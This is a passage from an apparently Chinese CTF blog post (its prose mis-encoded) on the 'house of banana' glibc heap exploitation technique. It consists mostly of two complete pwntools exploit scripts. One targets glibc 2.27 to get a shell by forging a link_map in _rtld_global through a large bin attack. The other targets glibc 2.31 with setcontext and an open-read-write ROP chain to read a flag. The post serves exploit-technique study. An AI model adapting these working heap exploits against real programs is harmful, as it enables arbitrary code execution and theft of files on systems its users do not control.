<p>æ³„éœ² <code>libc</code> å’Œå †åœ°å€ä¹‹åï¼Œæ‰“ <code>large bin attack</code> ï¼Œä¼ªé€  <code>link_map</code> ï¼Œå„ä¸ªå­—æ®µçš„èµ‹å€¼ä¸Šé¢å·²ç»è¿›è¡Œäº†è¯´æ˜ï¼Œä¸‹é¢æ˜¯ä¸¤ä¸ª <code>exp</code></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>æ‰“ <code>2.27</code> è·å– <code>shell</code> çš„ <code>exp</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xCFF</span></span><br><span class="line">d_d=<span class="number">0xD3B</span></span><br><span class="line">d_e=<span class="number">0xD27</span></span><br><span class="line">d_s=<span class="number">0xD13</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3ec090</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x250</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld_global=libc_base+<span class="number">0x61b060</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f302</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x3ec090</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)+p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_e,d_s)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">link_map=p64(<span class="number">0</span>)*<span class="number">1</span></span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x61c710</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">8</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=p64(one_gadget)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">58</span></span><br><span class="line">link_map+=p64(<span class="number">0x800000000</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,link_map)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127310.png" alt="image-20230217205309204"></p>
<p>æ‰“ <code>2.31</code> èµ° <code>orw</code> è¯»å‡º <code>flag</code> çš„ <code>exp</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xCFF</span></span><br><span class="line">d_d=<span class="number">0xD3B</span></span><br><span class="line">d_e=<span class="number">0xD27</span></span><br><span class="line">d_s=<span class="number">0xD13</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1ebfd0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld_global=libc_base+<span class="number">0x222060</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe6aee</span></span><br><span class="line">ret_addr=libc_base+<span class="number">0x0000000000025679</span></span><br><span class="line">setcontext=<span class="number">0x580DD</span>+libc_base</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011c1e1</span></span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_addr=libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x3ec090</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x290</span>)+p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">link_map=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x223740</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">0x20</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)</span><br><span class="line">link_map+=p64(setcontext)</span><br><span class="line">link_map+=p64(ret_addr)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsi</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">link_map+=p64(<span class="number">0x100</span>)<span class="comment">#rdx</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsp</span></span><br><span class="line">link_map+=p64(read_addr)<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">36</span></span><br><span class="line">link_map+=p64(<span class="number">0x800000000</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_e,d_s)</span><br><span class="line">edit(<span class="number">2</span>,link_map)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">flag_addr=heap_base+<span class="number">0xd00</span></span><br><span class="line">orw=p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">orw+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(write_addr)</span><br><span class="line">p.sendline(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127529.png" alt="image-20230217205622280"></p>
<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p><code>house of banana</code> æ˜¯ <code>ha1vk</code> å¸ˆå‚…æå‡ºæ¥çš„ä¸€ç§åˆ©ç”¨æ‰‹æ³•ï¼Œä¸<code>house</code> ç³»åˆ—çš„å¤§éƒ¨åˆ†æ”»å‡» <code>IO_FILE</code> çš„åˆ©ç”¨ä¸åŒï¼Œ<code>house of banana</code> æ˜¯æ”»å‡»çš„ <code>rtld_global</code> ç»“æ„ä½“ï¼Œä¼ªé€  <code>link_map</code> è¿›è¡Œçš„åŠ«æŒæ‰§è¡Œæµï¼Œåªéœ€è¦è¿›è¡Œä¸€æ¬¡ <code>large bin attack</code> å¹¶ä¸”èƒ½è°ƒç”¨ <code>exit</code> å‡½æ•°å³å¯è§¦å‘æ”»å‡»ï¼Œä¸è¿‡åœ¨æ”»å‡»è¿œç¨‹çš„æ—¶å€™å¯èƒ½éœ€è¦çˆ†ç ´ ï¼ˆ <code>ld</code> å’Œ <code>libc</code> çš„åç§»å¯èƒ½åœ¨æœ¬åœ°å’Œè¿œç¨‹ä¸å›ºå®šï¼‰</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">åŸåˆ›] CTF ä¸­ glibcå †åˆ©ç”¨ åŠ IO_FILE æ€»ç»“-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com (kanxue.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.buaq.net/go-85397.html">é«˜Glibcç‰ˆæœ¬ä¸‹çš„å †éªšæ“ä½œè§£æ (buaq.net)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222948#h3-5">house of banana-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" title="ä¸‹ä¸€é¡µ" aria-label="ä¸‹ä¸€é¡µ" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> å¼ºåŠ›é©±åŠ¨
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="è¿”å›é¡¶éƒ¨">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
